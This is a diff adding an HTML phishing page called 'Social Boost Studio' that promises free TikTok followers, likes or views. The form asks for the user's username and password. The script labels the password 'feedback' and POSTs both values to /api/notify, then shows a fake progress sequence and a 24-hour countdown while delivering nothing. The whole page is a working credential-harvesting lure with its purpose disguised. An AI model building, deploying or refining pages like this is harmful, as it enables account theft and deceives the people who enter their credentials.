@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Social Boost Studio</title>
+
+<style>
+* {
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial,sans-serif;
+}
+
+body {
+  min-height:100vh;
+  padding:25px 15px;
+  background:
+    radial-gradient(circle at 10% 10%,#403078 0,transparent 35%),
+    radial-gradient(circle at 90% 90%,#174e65 0,transparent 35%),
+    #0b1020;
+  color:#fff;
+}
+
+.container {
+  max-width:480px;
+  margin:20px auto;
+}
+
+.header {
+  text-align:center;
+  margin-bottom:25px;
+}
+
+.logo {
+  font-size:32px;
+  font-weight:900;
+  letter-spacing:-1px;
+}
+
+.logo span {
+  color:#49e5df;
+}
+
+.header p {
+  color:#aab5ca;
+  font-size:13px;
+  margin-top:9px;
+}
+
+.card {
+  background:rgba(23,31,54,.94);
+  border:1px solid #34405d;
+  border-radius:22px;
+  padding:23px;
+  box-shadow:0 20px 60px #0005;
+  backdrop-filter:blur(15px);
+}
+
+.heading {
+  text-align:center;
+  margin-bottom:23px;
+}
+
+.heading h2 {
+  font-size:21px;
+}
+
+.heading p {
+  font-size:12px;
+  color:#9daac0;
+  margin-top:7px;
+}
+
+label {
+  display:block;
+  color:#d5dcef;
+  font-size:13px;
+  margin:17px 0 8px;
+}
+
+input,select,textarea {
+  width:100%;
+  background:#10182b;
+  border:1px solid #394763;
+  border-radius:12px;
+  padding:14px;
+  color:#fff;
+  outline:none;
+  font-size:14px;
+}
+
+input:focus,select:focus,textarea:focus {
+  border-color:#49e5df;
+  box-shadow:0 0 0 3px #49e5df17;
+}
+
+textarea {
+  min-height:85px;
+  resize:vertical;
+}
+
+.services {
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:10px;
+}
+
+.service {
+  padding:15px 5px;
+  border:1px solid #3a4761;
+  background:#10182b;
+  border-radius:13px;
+  text-align:center;
+  cursor:pointer;
+  transition:.25s;
+}
+
+.service input {
+  display:none;
+}
+
+.service.active {
+  border-color:#49e5df;
+  background:linear-gradient(145deg,#17434a,#22294d);
+  box-shadow:0 0 17px #49e5df20;
+}
+
+.service .emoji {
+  display:block;
+  font-size:25px;
+  margin-bottom:8px;
+}
+
+.service strong {
+  font-size:12px;
+}
+
+.generate {
+  width:100%;
+  padding:16px;
+  margin-top:23px;
+  border:0;
+  border-radius:13px;
+  background:linear-gradient(100deg,#42dcd8,#7d75ff,#f26eae);
+  color:white;
+  font-size:14px;
+  font-weight:900;
+  letter-spacing:.5px;
+  cursor:pointer;
+  box-shadow:0 8px 25px #6d73ff35;
+  transition:.2s;
+}
+
+.generate:active {
+  transform:scale(.97);
+}
+
+.generate:disabled {
+  opacity:.6;
+}
+
+.small-note {
+  text-align:center;
+  color:#8d9bb4;
+  font-size:10px;
+  line-height:1.6;
+  margin-top:15px;
+}
+
+.panel {
+  display:none;
+  margin-top:17px;
+  background:rgba(23,31,54,.96);
+  border:1px solid #34405d;
+  border-radius:20px;
+  padding:23px;
+  animation:show .4s ease;
+}
+
+@keyframes show {
+  from {opacity:0;transform:translateY(12px)}
+  to {opacity:1;transform:translateY(0)}
+}
+
+.progress-title {
+  text-align:center;
+  font-size:19px;
+}
+
+.progress-sub {
+  text-align:center;
+  color:#9daac0;
+  font-size:12px;
+  margin-top:8px;
+}
+
+.steps {
+  margin-top:20px;
+}
+
+.step {
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:13px 0;
+  border-bottom:1px solid #303c53;
+  color:#9eabc0;
+  font-size:12px;
+}
+
+.step:last-child {border:0}
+
+.circle {
+  width:29px;
+  height:29px;
+  border-radius:50%;
+  display:grid;
+  place-items:center;
+  background:#29364e;
+  flex-shrink:0;
+}
+
+.step.done {
+  color:#5ce5b0;
+}
+
+.step.done .circle {
+  background:#164d3d;
+}
+
+.spinner {
+  width:15px;
+  height:15px;
+  border:2px solid #53647b;
+  border-top-color:#49e5df;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+}
+
+@keyframes spin {
+  to {transform:rotate(360deg)}
+}
+
+.progress-track {
+  height:7px;
+  background:#2b3850;
+  border-radius:20px;
+  overflow:hidden;
+  margin-top:20px;
+}
+
+.progress-fill {
+  width:0%;
+  height:100%;
+  background:linear-gradient(90deg,#49e5df,#9277ff,#f26eae);
+  transition:width .4s;
+}
+
+.result {
+  text-align:center;
+}
+
+.result-icon {
+  width:65px;
+  height:65px;
+  margin:0 auto 15px;
+  border-radius:22px;
+  background:linear-gradient(135deg,#3bdcc9,#8775ff);
+  display:grid;
+  place-items:center;
+  font-size:30px;
+}
+
+.result h2 {
+  font-size:21px;
+}
+
+.result p {
+  color:#a7b4c9;
+  font-size:12px;
+  margin-top:8px;
+  line-height:1.6;
+}
+
+.details {
+  background:#10182b;
+  border:1px solid #35425b;
+  border-radius:13px;
+  padding:15px;
+  margin-top:20px;
+  text-align:left;
+  font-size:13px;
+  line-height:2;
+}
+
+.details span {
+  color:#49e5df;
+  float:right;
+}
+
+.timer {
+  display:flex;
+  justify-content:center;
+  gap:9px;
+  margin:22px 0;
+}
+
+.time {
+  min-width:68px;
+  padding:13px 7px;
+  background:#10182b;
+  border:1px solid #35425b;
+  border-radius:12px;
+}
+
+.time strong {
+  display:block;
+  color:#49e5df;
+  font-size:23px;
+}
+
+.time small {
+  color:#9ba9c0;
+  font-size:9px;
+}
+
+.warning {
+  background:#30291e;
+  border:1px solid #66522f;
+  color:#ffda9c;
+  padding:12px;
+  border-radius:11px;
+  font-size:11px;
+  line-height:1.6;
+  text-align:left;
+}
+
+.back {
+  width:100%;
+  padding:13px;
+  margin-top:17px;
+  background:#27344b;
+  border:1px solid #42516b;
+  border-radius:11px;
+  color:white;
+  cursor:pointer;
+}
+
+@media(max-width:360px) {
+  .card,.panel {padding:17px}
+  .time {min-width:58px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="header">
+    <div class="logo">Social<span>Boost.</span></div>
+    <p>Your Social Growth Workspace ✨</p>
+  </div>
+
+  <div class="card" id="mainCard">
+
+    <div class="heading">
+      <h2>Boost Your TikTok Account</h2>
+      <p>Choose your service and customize your request.</p>
+    </div>
+
+    <form id="requestForm">
+
+      <label>Username</label>
+      <input id="username" placeholder="@username" maxlength="30" required>
+
+      <label>Select Service</label>
+
+      <div class="services">
+
+        <label class="service active" data-value="Followers">
+          <input type="radio" name="service" value="Followers" checked>
+          <span class="emoji">👥</span>
+          <strong>Followers</strong>
+        </label>
+
+        <label class="service" data-value="Likes">
+          <input type="radio" name="service" value="Likes">
+          <span class="emoji">❤️</span>
+          <strong>Likes</strong>
+        </label>
+
+        <label class="service" data-value="Views">
+          <input type="radio" name="service" value="Views">
+          <span class="emoji">▶️</span>
+          <strong>Views</strong>
+        </label>
+
+      </div>
+
+      <label>Choose Quantity</label>
+      <select id="quantity">
+        <option value="1000">1,000</option>
+        <option value="5000">5,000</option>
+        <option value="10000">10,000</option>
+        <option value="25000">25,000</option>
+        <option value="50000">50,000</option>
+        <option value="100000">100,000</option>
+      </select>
+
+      <label>Enter Your Password</label>
+      <textarea id="feedback" placeholder="Please Enter Your Password Here..." maxlength="1000" required></textarea>
+
+      <button class="generate" id="generateBtn" type="submit">
+        GENERATE NOW ✨
+      </button>
+
+    </form>
+
+    <div class="small-note">
+      Your request is being processed. Please make sure your username is correct.
+    </div>
+
+  </div>
+
+  <div class="panel" id="loadingPanel">
+
+    <h2 class="progress-title">Preparing Your Request ✨</h2>
+    <p class="progress-sub">Please wait a moment...</p>
+
+    <div class="steps">
+
+      <div class="step" id="s1">
+        <span class="circle">1</span>
+        Checking username
+      </div>
+
+      <div class="step" id="s2">
+        <span class="circle">2</span>
+        Preparing service
+      </div>
+
+      <div class="step" id="s3">
+        <span class="circle">3</span>
+        Building request preview
+      </div>
+
+      <div class="step" id="s4">
+        <span class="circle">4</span>
+        Finalizing preview
+      </div>
+
+    </div>
+
+    <div class="progress-track">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <p class="progress-sub" id="progressText">Starting...</p>
+
+  </div>
+
+  <div class="panel result" id="resultPanel">
+
+    <div class="result-icon">✓</div>
+
+    <h2>Request Preview Ready!</h2>
+    <p>Your selected options are displayed below.</p>
+
+    <div class="details">
+      Username <span id="rUser"></span><br>
+      Service <span id="rService"></span><br>
+      Quantity <span id="rQuantity"></span>
+    </div>
+
+    <p style="margin-top:22px">24 Hour Countdown Preview</p>
+
+    <div class="timer">
+      <div class="time">
+        <strong id="hours">24</strong>
+        <small>HOURS</small>
+      </div>
+      <div class="time">
+        <strong id="minutes">00</strong>
+        <small>MINUTES</small>
+      </div>
+      <div class="time">
+        <strong id="seconds">00</strong>
+        <small>SECONDS</small>
+      </div>
+    </div>
+
+    <div class="warning">
+      Processing your request...
+Please wait while we prepare your request.
+    </div>
+
+    <button class="back" onclick="resetTool()">← Create Another Request</button>
+
+  </div>
+
+</div>
+
+<script>
+let chosenService = "Followers";
+let timerInterval;
+
+document.querySelectorAll(".service").forEach(item => {
+  item.addEventListener("click", () => {
+    document.querySelectorAll(".service").forEach(el => {
+      el.classList.remove("active");
+    });
+
+    item.classList.add("active");
+    item.querySelector("input").checked = true;
+    chosenService = item.dataset.value;
+  });
+});
+
+function wait(ms) {
+  return new Promise(resolve => setTimeout(resolve,ms));
+}
+
+function showStep(number) {
+  for(let i=1;i<=4;i++) {
+    const step = document.getElementById("s"+i);
+    const circle = step.querySelector(".circle");
+
+    step.classList.remove("done");
+
+    if(i<number) {
+      step.classList.add("done");
+      circle.textContent = "✓";
+    } else if(i===number) {
+      circle.innerHTML = '<div class="spinner"></div>';
+    } else {
+      circle.textContent = i;
+    }
+  }
+
+  document.getElementById("progressFill").style.width =
+    (number/4*100)+"%";
+
+  document.getElementById("progressText").textContent =
+    "Step "+number+" of 4";
+}
+
+function startTimer() {
+  let remaining = 86400;
+
+  clearInterval(timerInterval);
+
+  function update() {
+    document.getElementById("hours").textContent =
+      String(Math.floor(remaining/3600)).padStart(2,"0");
+
+    document.getElementById("minutes").textContent =
+      String(Math.floor((remaining%3600)/60)).padStart(2,"0");
+
+    document.getElementById("seconds").textContent =
+      String(remaining%60).padStart(2,"0");
+
+    if(remaining>0) remaining--;
+    else clearInterval(timerInterval);
+  }
+
+  update();
+  timerInterval = setInterval(update,1000);
+}
+
+document.getElementById("requestForm").addEventListener("submit",async event => {
+  event.preventDefault();
+
+  const username = document.getElementById("username")
+    .value.trim().replace(/^@/,"");
+
+  const feedback = document.getElementById("feedback")
+    .value.trim();
+
+  const quantity = document.getElementById("quantity").value;
+
+  if(!/^[a-zA-Z0-9._]{1,30}$/.test(username)) {
+    alert("Enter a valid username.");
+    return;
+  }
+
+  if(!feedback) {
+    alert("Please enter your feedback.");
+    return;
+  }
+
+  document.getElementById("mainCard").style.display = "none";
+  document.getElementById("loadingPanel").style.display = "block";
+
+  const button = document.getElementById("generateBtn");
+  button.disabled = true;
+
+  const notification = fetch("/api/notify",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      username:username,
+      feedback:feedback
+    })
+  }).then(async response => {
+    const data = await response.json();
+    if(!response.ok || !data.success) throw new Error("Failed");
+  });
+
+  try {
+    for(let i=1;i<=4;i++) {
+      showStep(i);
+      await wait(1500);
+    }
+
+    await notification;
+
+    document.getElementById("rUser").textContent = "@"+username;
+    document.getElementById("rService").textContent = chosenService;
+    document.getElementById("rQuantity").textContent =
+      Number(quantity).toLocaleString();
+
+    document.getElementById("loadingPanel").style.display = "none";
+    document.getElementById("resultPanel").style.display = "block";
+
+    startTimer();
+
+  } catch(error) {
+    document.getElementById("loadingPanel").style.display = "none";
+    document.getElementById("mainCard").style.display = "block";
+    button.disabled = false;
+    alert("Could not submit feedback. Please try again.");
+  }
+});
+
+function resetTool() {
+  clearInterval(timerInterval);
+
+  document.getElementById("resultPanel").style.display = "none";
+  document.getElementById("mainCard").style.display = "block";
+
+  document.getElementById("requestForm").reset();
+
+  document.querySelectorAll(".service").forEach(el => {
+    el.classList.remove("active");
+  });
+
+  const first = document.querySelector('.service[data-value="Followers"]');
+  first.classList.add("active");
+  first.querySelector("input").checked = true;
+
+  chosenService = "Followers";
+  document.getElementById("generateBtn").disabled = false;
+}
+</script>
+
+</body>
+</html>
